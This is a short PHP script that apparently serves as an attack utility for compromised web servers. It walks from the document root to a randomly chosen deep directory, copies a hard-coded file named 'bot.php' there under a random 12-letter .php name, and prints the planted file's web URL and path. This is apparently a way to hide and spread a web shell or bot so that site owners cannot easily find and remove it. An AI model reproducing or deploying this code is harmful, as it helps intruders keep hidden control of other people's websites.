<?
function change( $path = NULL ){
	GLOBAL $_SERVER , $oldpath ;
	if(!isset($path)){
	$path = $_SERVER["DOCUMENT_ROOT"];
	}
	$files = array_diff(scandir($path), array('..', '.'));
	$dirs = array();
	foreach ($files as $file) {
		if(@is_dir($path.DIRECTORY_SEPARATOR.$file)){
			array_push($dirs, $path.DIRECTORY_SEPARATOR.$file);
		}
	}
	if(count($dirs)==0){
		$turn = array();
		$name = randName().".php";
		/////
		$data = file_get_contents($oldpath);
		file_put_contents($path.DIRECTORY_SEPARATOR.$name ,$data);
		$newpath =  $path.DIRECTORY_SEPARATOR.$name;
		$newpath = "http://".$_SERVER["HTTP_HOST"].str_replace($_SERVER["DOCUMENT_ROOT"], "", $newpath);
		$turn["link"] = $newpath;
		$turn["path"] = $path.DIRECTORY_SEPARATOR.$name;
		echo json_encode($turn);

	}
	else {
		change($dirs[rand(0,count($dirs)-1)]);
	}
	
}
function randName ($lenght = 12 ){
	$abc = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
	$name ="";
	for ($i=0; $i <$lenght ; $i++) { 
		$name.=$abc[rand(0,strlen($abc)-1)];
	}
	return $name;
}
$oldpath = '/Applications/MAMP/htdocs/m/bot.php' ;change() ;?>